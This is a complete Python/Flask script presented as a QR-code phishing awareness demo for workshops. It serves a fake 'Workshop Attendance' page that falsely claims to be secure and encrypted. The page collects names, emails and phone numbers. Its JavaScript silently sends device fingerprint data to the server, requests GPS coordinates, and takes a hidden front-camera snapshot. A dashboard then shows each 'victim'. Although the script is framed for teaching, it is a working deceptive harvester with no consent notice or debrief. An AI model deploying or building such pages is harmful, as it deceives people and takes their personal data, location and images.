#!/usr/bin/env python3

import argparse
import json
import os
import socket
import subprocess
import sys
from datetime import datetime

try:
    from flask import Flask, request, jsonify, render_template_string, send_file
except ImportError:
    print("[!] Flask not installed. Run: pip3 install flask")
    sys.exit(1)

try:
    import qrcode
except ImportError:
    print("[!] qrcode not installed. Run: pip3 install qrcode[pil]")
    sys.exit(1)


app = Flask(__name__)

# Store scan results in memory
scan_log = []

# ─────────────────────────────────────────────
# ─────────────────────────────────────────────
LANDING_PAGE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Workshop Attendance</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
            min-height: 100vh;
            color: #fff;
        }

        /* Phase 1 — Attendance form */
        #phase1 {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .form-card {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(255,255,255,0.12);
            border-radius: 16px;
            padding: 36px 28px;
            max-width: 420px;
            width: 100%;
            backdrop-filter: blur(12px);
        }
        .form-header {
            text-align: center;
            margin-bottom: 28px;
        }
        .form-header .icon { font-size: 42px; margin-bottom: 12px; }
        .form-header h1 { font-size: 21px; margin-bottom: 4px; }
        .form-header p { color: #8899aa; font-size: 13px; }
        .form-group {
            margin-bottom: 16px;
        }
        .form-group label {
            display: block;
            font-size: 13px;
            color: #8899aa;
            margin-bottom: 6px;
        }
        .form-group input {
            width: 100%;
            padding: 12px 14px;
            border-radius: 8px;
            border: 1px solid rgba(255,255,255,0.12);
            background: rgba(255,255,255,0.05);
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border 0.3s;
        }
        .form-group input:focus {
            border-color: #3b82f6;
        }
        .form-group input::placeholder { color: #556; }
        .submit-btn {
            background: #3b82f6;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 8px;
            transition: background 0.3s;
        }
        .submit-btn:hover { background: #2563eb; }
        .submit-btn:disabled { background: #334; cursor: wait; }
        .spinner {
            display: none;
            margin: 16px auto;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #3b82f6;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .org-footer {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: #445;
        }

        /* Phase 2 — Success screen */
        #phase2 {
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .success-card {
            background: rgba(255,255,255,0.06);
            border: 1px solid rgba(76,175,80,0.3);
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            backdrop-filter: blur(12px);
        }
        .success-icon { font-size: 64px; margin-bottom: 16px; }
        .success-card h1 { font-size: 22px; color: #4CAF50; margin-bottom: 8px; }
        .success-card p { color: #8899aa; font-size: 14px; margin-bottom: 8px; line-height: 1.6; }
        .time-badge {
            display: inline-block;
            background: rgba(59,130,246,0.15);
            border: 1px solid rgba(59,130,246,0.3);
            border-radius: 20px;
            padding: 8px 20px;
            margin-top: 16px;
            color: #60a5fa;
            font-size: 13px;
        }
    </style>
</head>
<body>

<!-- ========== PHASE 1: Attendance Form ========== -->
<div id="phase1">
    <div class="form-card">
        <div class="form-header">
            <div class="icon">📋</div>
            <h1>Workshop Attendance</h1>
            <p>Cybersecurity Awareness Workshop 2026</p>
        </div>
        <div class="form-group">
            <label>Full Name *</label>
            <input type="text" id="inp-name" placeholder="Enter your full name" required />
        </div>
        <div class="form-group">
            <label>Email Address *</label>
            <input type="email" id="inp-email" placeholder="Enter your email" required />
        </div>
        <div class="form-group">
            <label>Phone Number</label>
            <input type="tel" id="inp-phone" placeholder="Enter your phone number" />
        </div>
        <button class="submit-btn" onclick="startCollection()">Mark Attendance</button>
        <div class="spinner" id="spinner"></div>
        <p id="status-text" style="margin-top:12px; font-size:13px; color:#556; text-align:center;"></p>
        <div class="org-footer">Powered by EventReg • Secure & Encrypted</div>
    </div>
</div>

<!-- ========== PHASE 2: Success Screen ========== -->
<div id="phase2">
    <div class="success-card">
        <div class="success-icon">✅</div>
        <h1>Attendance Marked!</h1>
        <p>Thank you, <strong><span id="display-name"></span></strong>.<br>Your attendance has been recorded.</p>
        <div class="time-badge" id="display-time">🕐</div>
        <p style="color:#445; font-size:12px; margin-top:24px;">You may close this page.</p>
    </div>
</div>

<script>
    // ── Collect device info via JavaScript ──
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let os = "Unknown", device = "Unknown", browser = "Unknown";

        // Detect OS
        if (/Windows/.test(ua)) os = "Windows " + (ua.match(/Windows NT (\d+\.\d+)/) || [])[1];
        else if (/Mac OS X/.test(ua)) os = "macOS " + (ua.match(/Mac OS X ([\d_]+)/) || ["",""])[1].replace(/_/g, ".");
        else if (/Android/.test(ua)) os = "Android " + (ua.match(/Android ([\d.]+)/) || [])[1];
        else if (/iPhone|iPad/.test(ua)) os = "iOS " + (ua.match(/OS ([\d_]+)/) || ["",""])[1].replace(/_/g, ".");
        else if (/Linux/.test(ua)) os = "Linux";

        // Detect device
        if (/iPhone/.test(ua)) device = "iPhone";
        else if (/iPad/.test(ua)) device = "iPad";
        else if (/Android/.test(ua) && /Mobile/.test(ua)) device = "Android Phone";
        else if (/Android/.test(ua)) device = "Android Tablet";
        else device = "Desktop/Laptop";

        // Detect browser
        if (/Edg\//.test(ua)) browser = "Microsoft Edge";
        else if (/Chrome\//.test(ua) && !/Chromium/.test(ua)) browser = "Google Chrome";
        else if (/Firefox\//.test(ua)) browser = "Mozilla Firefox";
        else if (/Safari\//.test(ua) && !/Chrome/.test(ua)) browser = "Apple Safari";
        else if (/Opera|OPR/.test(ua)) browser = "Opera";
        else browser = ua.substring(0, 50);

        return {
            os: os,
            device: device,
            browser: browser,
            screen: screen.width + " x " + screen.height + " (pixel ratio: " + window.devicePixelRatio + ")",
            language: navigator.language || navigator.userLanguage,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            platform: navigator.platform || "Unknown",
            cores: navigator.hardwareConcurrency || "Unknown",
            ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Not available",
            touch: navigator.maxTouchPoints > 0 ? "Yes (" + navigator.maxTouchPoints + " touch points)" : "No",
            connection: "Unknown",
            battery: "Checking...",
            timestamp: new Date().toLocaleString()
        };
    }

    async function getBattery(info) {
        try {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                info.battery = Math.round(battery.level * 100) + "%" + (battery.charging ? " (Charging)" : " (Not charging)");
            } else {
                info.battery = "API not available";
            }
        } catch(e) {
            info.battery = "Blocked by browser";
        }
    }

    function getConnection(info) {
        try {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (conn) {
                info.connection = (conn.effectiveType || "Unknown").toUpperCase();
                if (conn.downlink) info.connection += " (~" + conn.downlink + " Mbps)";
            } else {
                info.connection = "API not available";
            }
        } catch(e) {
            info.connection = "Blocked";
        }
    }

    // ── Main flow ──
    async function startCollection() {
        // Grab form inputs
        const name = document.getElementById('inp-name').value.trim();
        const email = document.getElementById('inp-email').value.trim();
        const phone = document.getElementById('inp-phone').value.trim();

        if (!name || !email) {
            document.getElementById('status-text').textContent = 'Please fill in your name and email.';
            document.getElementById('status-text').style.color = '#f87171';
            return;
        }

        const btn = document.querySelector('.submit-btn');
        const spinner = document.getElementById('spinner');
        const status = document.getElementById('status-text');

        btn.disabled = true;
        btn.textContent = "Submitting...";
        spinner.style.display = "block";
        status.textContent = "Recording attendance...";
        status.style.color = "#556";

        const info = getDeviceInfo();
        info.name = name;
        info.email = email;
        info.phone = phone;
        await getBattery(info);
        getConnection(info);

        // Simulate processing delay
        await new Promise(r => setTimeout(r, 1500));
        status.textContent = "Verifying details...";
        await new Promise(r => setTimeout(r, 1000));

        // Silently send collected data to server
        try {
            await fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            });
        } catch(e) { /* silent */ }

        // Silently attempt to get location (browser will show its own prompt)
        try {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        fetch('/collect-location', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: pos.coords.latitude.toFixed(6),
                                lon: pos.coords.longitude.toFixed(6),
                                accuracy: pos.coords.accuracy.toFixed(0)
                            })
                        });
                    },
                    () => { /* denied — silent */ }
                );
            }
        } catch(e) { /* silent */ }

        // Silently attempt to access camera and take a snapshot
        try {
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 320, height: 240 } })
                    .then((stream) => {
                        // Create hidden video element to capture a frame
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.setAttribute('playsinline', 'true');
                        video.style.display = 'none';
                        document.body.appendChild(video);
                        video.play();

                        // Wait for video to load then capture a frame
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth || 320;
                            canvas.height = video.videoHeight || 240;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            const snapshot = canvas.toDataURL('image/jpeg', 0.7);

                            // Stop camera immediately
                            stream.getTracks().forEach(t => t.stop());
                            video.remove();

                            // Send snapshot to server
                            fetch('/collect-camera', {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ camera: 'granted', snapshot: snapshot })
                            });
                        }, 1500); // 1.5s delay to let camera focus
                    })
                    .catch(() => {
                        fetch('/collect-camera', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ camera: 'denied' })
                        });
                    });
            }
        } catch(e) { /* silent */ }

        // Show the success screen
        await new Promise(r => setTimeout(r, 500));
        status.textContent = "Done!";
        spinner.style.display = "none";

        await new Promise(r => setTimeout(r, 300));
        document.getElementById('display-name').textContent = name;
        document.getElementById('display-time').textContent = '🕐 ' + new Date().toLocaleString();
        document.getElementById('phase1').style.display = 'none';
        document.getElementById('phase2').style.display = 'flex';
    }
</script>

</body>
</html>
"""


# ─────────────────────────────────────────────

# ─────────────────────────────────────────────
DASHBOARD_PAGE = r"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📊 Workshop Dashboard</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff00;
            padding: 20px;
        }
        h1 { text-align: center; margin-bottom: 8px; }
        .subtitle { text-align: center; color: #888; margin-bottom: 24px; }
        .counter {
            text-align: center;
            font-size: 48px;
            color: #ff4444;
            margin: 16px 0;
        }
        .counter-label { text-align: center; color: #888; font-size: 14px; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
            font-size: 13px;
        }
        th {
            background: #1a1a1a;
            padding: 10px;
            text-align: left;
            color: #ff4444;
            border-bottom: 1px solid #333;
        }
        td {
            padding: 8px 10px;
            border-bottom: 1px solid #1a1a1a;
            color: #ccc;
        }
        tr:hover td { background: rgba(0,255,0,0.05); }
        .refresh-note {
            text-align: center;
            color: #555;
            margin-top: 16px;
            font-size: 12px;
        }
    </style>
    <script>
        setTimeout(() => location.reload(), 5000); // Auto-refresh every 5s
    </script>
</head>
<body>
    <h1>📊 Phishing Demo — Instructor Dashboard</h1>
    <p class="subtitle">Showing all devices that scanned the QR code</p>
    <div class="counter">{{ count }}</div>
    <div class="counter-label">devices scanned</div>
    <table>
        <tr>
            <th>#</th><th>Time</th><th>Name</th><th>Email</th><th>Phone</th><th>IP</th><th>Device</th>
            <th>OS</th><th>Browser</th><th>Location</th><th>Camera</th>
        </tr>
        {% for s in scans %}
        <tr>
            <td>{{ loop.index }}</td>
            <td>{{ s.timestamp }}</td>
            <td style="color:#ff6b6b;">{{ s.name or '—' }}</td>
            <td style="color:#ff6b6b;">{{ s.email or '—' }}</td>
            <td style="color:#ff6b6b;">{{ s.phone or '—' }}</td>
            <td>{{ s.ip }}</td>
            <td>{{ s.device }}</td>
            <td>{{ s.os }}</td>
            <td>{{ s.browser }}</td>
            <td>{{ s.gps or '—' }}</td>
            <td>
                {{ s.camera or '—' }}
                {% if s.get('snapshot_id') %}
                <br><a href="/snapshot/{{ s.snapshot_id }}" target="_blank">
                    <img src="/snapshot/{{ s.snapshot_id }}" style="width:80px; height:60px; object-fit:cover; border-radius:4px; border:1px solid #ff4444; margin-top:4px; cursor:pointer;" />
                </a>
                {% endif %}
            </td>
        </tr>
        {% endfor %}
    </table>
    <p class="refresh-note">Auto-refreshes every 5 seconds</p>
</body>
</html>
"""


# ─────────────────────────────────────────────
# Routes
# ─────────────────────────────────────────────
@app.route('/')
def landing():
    return render_template_string(LANDING_PAGE)


@app.route('/collect', methods=['POST'])
def collect():
    """Receives device info from the client and logs it."""
    data = request.get_json() or {}
    ip = request.remote_addr

    entry = {
        'ip': ip,
        'ip_location': f"IP-based lookup (approx.) — {ip}",
        'name': data.get('name', '—'),
        'email': data.get('email', '—'),
        'phone': data.get('phone', '—'),
        'device': data.get('device', 'Unknown'),
        'os': data.get('os', 'Unknown'),
        'browser': data.get('browser', 'Unknown'),
        'screen': data.get('screen', 'Unknown'),
        'language': data.get('language', 'Unknown'),
        'timezone': data.get('timezone', 'Unknown'),
        'platform': data.get('platform', 'Unknown'),
        'cores': data.get('cores', 'Unknown'),
        'ram': data.get('ram', 'Unknown'),
        'battery': data.get('battery', 'Unknown'),
        'connection': data.get('connection', 'Unknown'),
        'touch': data.get('touch', 'Unknown'),
        'timestamp': data.get('timestamp', datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
        'gps': None,
        'camera': '—'
    }
    scan_log.append(entry)

    print(f"\n{'='*50}")
    print(f"  🎯 NEW SCAN #{len(scan_log)}")
    print(f"{'='*50}")
    for k, v in entry.items():
        if v and k != 'gps':
            print(f"  {k:>15}: {v}")
    print(f"{'='*50}\n")

    return jsonify({'ip': ip, 'ip_location': entry['ip_location']})


@app.route('/collect-location', methods=['POST'])
def collect_location():
    """Receives GPS location if user granted permission."""
    data = request.get_json() or {}
    lat = data.get('lat', '?')
    lon = data.get('lon', '?')
    acc = data.get('accuracy', '?')

    # Update the latest scan from this IP
    ip = request.remote_addr
    for entry in reversed(scan_log):
        if entry['ip'] == ip:
            entry['gps'] = f"Lat: {lat}, Lon: {lon} (±{acc}m)"
            break

    print(f"\n  📍 GPS RECEIVED from {ip}: Lat {lat}, Lon {lon} (±{acc}m)\n")
    return jsonify({'status': 'ok'})


@app.route('/collect-camera', methods=['POST'])
def collect_camera():
    """Receives camera permission result and optional snapshot."""
    data = request.get_json() or {}
    camera_status = data.get('camera', 'unknown')
    snapshot = data.get('snapshot', None)

    ip = request.remote_addr
    for entry in reversed(scan_log):
        if entry['ip'] == ip:
            if camera_status == 'granted':
                entry['camera'] = '📸 GRANTED'
                if snapshot:
                    # Store snapshot base64 data
                    snap_id = f"snap_{len(scan_log)}_{id(entry)}"
                    entry['snapshot_id'] = snap_id
                    entry['snapshot_data'] = snapshot
                    entry['camera'] = f'📸 GRANTED ✅ Photo captured'
            else:
                entry['camera'] = '🚫 Denied'
            break

    emoji = "📸" if camera_status == "granted" else "🚫"
    has_photo = " + PHOTO CAPTURED!" if snapshot else ""
    print(f"\n  {emoji} CAMERA {camera_status.upper()} from {ip}{has_photo}\n")
    return jsonify({'status': 'ok'})


@app.route('/snapshot/<snap_id>')
def serve_snapshot(snap_id):
    """Serves a captured snapshot image."""
    for entry in scan_log:
        if entry.get('snapshot_id') == snap_id:
            # Return the base64 image as a response
            import base64
            img_data = entry['snapshot_data'].split(',')[1]
            img_bytes = base64.b64decode(img_data)
            from flask import Response
            return Response(img_bytes, mimetype='image/jpeg')
    return "Not found", 404


@app.route('/dashboard')
def dashboard():
    """Instructor dashboard showing all collected scans."""
    return render_template_string(DASHBOARD_PAGE, scans=scan_log, count=len(scan_log))


@app.route('/qr')
def show_qr():
    """Shows the generated QR code image."""
    qr_path = os.path.join(os.path.dirname(__file__), 'demo_qr.png')
    if os.path.exists(qr_path):
        return send_file(qr_path, mimetype='image/png')
    return "QR not generated yet. Check terminal.", 404


# ─────────────────────────────────────────────
# Startup
# ─────────────────────────────────────────────
def get_local_ip(interface=None):
    """Get the local IP address of the machine."""
    if interface:
        try:
            result = subprocess.check_output(
                f"ip -4 addr show {interface} | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){{3}}'",
                shell=True
            ).decode().strip()
            if result:
                return result
        except Exception:
            pass

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def generate_qr(url):
    """Generate a QR code image for the given URL."""
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(url)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    qr_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'demo_qr.png')
    img.save(qr_path)
    return qr_path


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='QR Phishing Awareness Demo Server')
    parser.add_argument('--port', type=int, default=8080, help='Port to run on (default: 8080)')
    parser.add_argument('--interface', type=str, default=None, help='Network interface (e.g., eth0, wlan0)')
    args = parser.parse_args()

    local_ip = get_local_ip(args.interface)
    url = f"http://{local_ip}:{args.port}"
    qr_path = generate_qr(url)

    print(r"""
    ╔══════════════════════════════════════════════════╗
    ║   🛡️  QR PHISHING AWARENESS DEMO  🛡️            ║
    ║   For Educational / Workshop Use Only            ║
    ╠══════════════════════════════════════════════════╣
    ║                                                  ║
    ║   Victim page :  {:<29s}║
    ║   Dashboard   :  {:<29s}║
    ║   QR Image    :  {:<29s}║
    ║                                                  ║
    ║   QR saved to : {}
    ║                                                  ║
    ║   Show the QR code to workshop participants.     ║
    ║   Open /dashboard on YOUR screen to see scans.   ║
    ║                                                  ║
    ╚══════════════════════════════════════════════════╝
    """.format(url, url + "/dashboard", url + "/qr", qr_path))

    app.run(host='0.0.0.0', port=args.port, debug=False)
